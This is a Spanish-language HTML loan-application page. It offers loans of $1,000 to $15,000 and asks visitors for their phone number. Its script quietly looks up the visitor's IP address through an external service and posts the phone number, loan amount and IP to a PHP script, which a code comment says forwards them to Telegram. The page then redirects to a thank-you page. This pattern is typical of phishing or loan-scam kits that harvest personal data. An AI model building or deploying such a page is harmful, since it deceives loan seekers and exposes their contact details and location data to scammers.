<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solicita tu Préstamo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }

        .container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }

        .slider-container {
            margin: 20px 0;
        }

        .slider {
            -webkit-appearance: none;
            width: 100%;
            height: 15px;
            background: #e0f2e9;
            outline: none;
            border-radius: 10px;
            box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.1);
            transition: background 0.3s ease;
        }

        .slider::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background: #4CAF50;
            cursor: pointer;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            transition: background-color 0.3s ease;
        }

        .slider::-webkit-slider-thumb:hover {
            background-color: #388e3c;
        }

        .output {
            font-weight: bold;
            color: #004d26;
            font-size: 24px;
            margin-bottom: 10px;
        }

        .input-group {
            margin: 20px 0;
        }

        input[type="tel"] {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 2px solid #004d26;
            border-radius: 5px;
            background-color: #f9f9f9;
        }

        button {
            background-color: #09610c;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #043d07;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Solicita tu Préstamo</h1>

    <div class="slider-container">
        <label for="loanAmount">Monto del préstamo:</label>
        <div class="output" id="loanOutput">$1000</div>
        <input type="range" min="1000" max="15000" value="1000" class="slider" id="loanAmount">
    </div>

    <div class="input-group">
        <input type="tel" id="phone" placeholder="Ingresa tu número de teléfono">
    </div>

    <button onclick="enviarDatos()">Continuar</button>
</div>

<script>
    const loanAmount = document.getElementById("loanAmount");
    const loanOutput = document.getElementById("loanOutput");

    loanAmount.oninput = function() {
        loanOutput.textContent = `$${this.value}`;
    };

    function enviarDatos() {
        const monto = loanAmount.value;
        const telefono = document.getElementById("phone").value;

        if (telefono === "") {
            alert("Por favor, ingresa tu número de teléfono.");
            return;
        }

        // Obtener la IP del cliente
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;

                // Enviar los datos al archivo PHP para enviarlos a Telegram
                fetch('datos_de_tel2.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: `monto=${monto}&telefono=${telefono}&ip=${ip}`
                })
                .then(response => {
                    if (response.ok) {
                        window.location.href = "gracias.html"; // Redirigir a la página de agradecimiento
                    } else {
                        alert("Hubo un problema al enviar los datos.");
                    }
                });
            });
    }
</script>

</body>
</html>
